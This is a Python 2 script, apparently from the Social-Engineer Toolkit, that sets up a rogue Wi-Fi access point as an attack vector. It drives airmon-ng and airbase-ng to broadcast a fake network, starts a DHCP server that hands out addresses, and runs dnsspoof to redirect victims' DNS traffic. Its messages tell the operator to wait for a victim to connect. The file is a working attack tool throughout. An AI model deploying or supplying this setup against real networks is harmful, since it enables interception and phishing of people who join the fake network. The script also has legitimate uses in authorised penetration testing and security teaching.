#!/usr/bin/env python
##############################################
#
# This is a basic setup for an access point
# attack vector in set.
#
##############################################

import sys
import os
import subprocess
import re
import pexpect
import time
from src.core.core import *

# grab configuration options here
fileopen=file("config/set_config", "r")
for line in fileopen:
    line=line.rstrip()
    # look for access point ssid
    match = re.search("ACCESS_POINT_SSID=", line)
    if match: access_point = line.replace("ACCESS_POINT_SSID=", "")

    # look for airbase path
    match1 = re.search("AIRBASE_NG_PATH=", line)
    if match1: 
        airbase_path = line.replace("AIRBASE_NG_PATH=", "")
        if not os.path.isfile(airbase_path):
            if os.path.isfile("/usr/local/sbin/airbase-ng"): airbase_path = "/usr/local/sbin/airbase-ng"

    # look for dnsspoof
    match2=re.search("DNSSPOOF_PATH=", line)
    if match2: dnsspoof_path = line.replace("DNSSPOOF_PATH=", "")


    # grab access point channel
    match=re.search("AP_CHANNEL=", line)
    # if we hit on AP_CHANNEL in set_config
    if match:
        # replace line and define ap_channel
        ap_channel = line.replace("AP_CHANNEL=", "")
        # default if not found
        if ap_channel == "": ap_channel = "9"

if not os.path.isfile(dnsspoof_path):
    if os.path.isfile("/usr/local/sbin/dnsspoof"):
        dnsspoof_path = "/usr/local/sbin/dnsspoof"
    else:
        print "[*] DNSSpoof was not found. Exiting...."
        sys.exit()

if not os.path.isfile(airbase_path):
    airbase_path = "src/wireless/airbase-ng"

# DHCP SERVER CONFIG HERE
dhcp_config = ("""
option domain-name-servers 10.0.0.1;

default-lease-time 60;
max-lease-time 72;

ddns-update-style none;

authoritative;

log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
        range 10.0.0.100 10.0.0.254;
        option routers 10.0.0.1;
        option domain-name-servers 10.0.0.1;
}
""")

interface = raw_input("Enter the wireless network interface (ex. wlan0): ")

# place wifi interface into monitor mode
print ("[*] Placing card in monitor mode via airmon-ng..")

# if we have it already installed then don't use the SET one
if os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "/usr/local/sbin/airmon-ng"

if not os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "src/wireless/airmon-ng"

subprocess.Popen("%s start %s" % (airmonng_path,interface), shell=True).wait()

# execute modprobe tun
subprocess.Popen("modprobe tun", shell=True).wait()

# create a fake access point
print ("[*] Spawning airbase-ng in a seperate child thread...")
child = pexpect.spawn('%s -P -C 20 -e "%s" -c %s -v mon0' % (airbase_path, access_point,ap_channel))
print ("[*] Sleeping 15 seconds waiting for airbase-ng to complete...")
time.sleep(15)

# bring the interface up
print ("[*] Bringing up the access point interface...")
subprocess.Popen("ifconfig at0 up 10.0.0.1 netmask 255.255.255.0", shell=True).wait()

# writes the dhcp server out
print ("[*] Writing the dhcp configuration file to src/program_junk")
filewrite=file("src/program_junk/dhcp.conf", "w")
filewrite.write(dhcp_config)
# close the file
filewrite.close()

# starts a dhcp server
print ("[*] Starting the DHCP server on a seperate child thread...")
child1 = pexpect.spawn("dhcpd3 -cf src/program_junk/dhcp.conf at0")

# start dnsspoof
print ("[*] Starting DNSSpoof in a seperate child thread...")
child2 = pexpect.spawn("%s -i at0" % (dnsspoof_path))

print ("[*] SET has finished creating the attack. If you experienced issues please report them.")
print ("[*] Now launch SET attack vectors within the menus and have a victim connect via wireless.")
print ("[*] Be sure to come back to this menu to stop the services once your finished.")
pause = raw_input("[*] Press [return] to go back to the main menu.")
